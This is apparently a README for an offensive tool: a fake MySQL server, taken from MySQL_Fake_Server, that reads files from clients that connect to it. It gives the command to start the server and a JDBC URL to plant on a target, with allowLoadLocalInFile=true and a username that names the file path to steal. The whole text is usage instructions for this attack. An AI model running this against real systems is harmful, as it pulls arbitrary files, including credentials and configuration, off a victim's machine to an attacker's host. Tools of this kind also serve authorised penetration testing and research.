# File reading MySQL server

Proto from: https://github.com/waldiTM/python-mysqlproto
Original from: https://github.com/fnmsd/MySQL_Fake_Server

This just provides the file read component of the MySQL_Fake_Server

## Usage

Server Side:
```bash
python server.py
```

JDBC URL on target:

```
jdbc:mysql://server.host/test?allowLoadLocalInFile=true&user=fileread_/path/to/file
```



